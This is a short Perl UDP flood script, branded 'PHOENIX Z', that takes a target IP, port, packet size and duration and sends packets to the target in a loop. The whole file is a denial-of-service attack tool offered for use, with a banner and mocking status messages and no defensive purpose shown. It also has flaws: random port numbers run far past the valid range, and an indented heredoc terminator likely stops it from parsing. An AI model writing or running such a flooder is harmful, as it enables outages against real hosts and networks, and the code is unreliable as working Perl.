#!/usr/bin/perl

##
# PHOENIX Z <----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
    ____  __  __ ___  _____ _   __ ____  __    _____
   / __ \/ / / / __ \/ ____/ | / // _/ |/ /   /__  /
  / /_/ / /_/ / / / / __/ /  |/ // / |   /      / / 
 / ____/ __  / /_/ / /___/ /|  // / /   |      / /__
/_/   /_/ /_/\____/_____/_/ |_/___//_/|_|     /____/


							Create By PHOENIX Z               .

   Command <ip> <port> <Size> <time>.
   EOTEXT

print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~SnowmaN~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "STOP with Ctrl-C\n" unless $time;       # หยุดกด  Ctrl-C

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}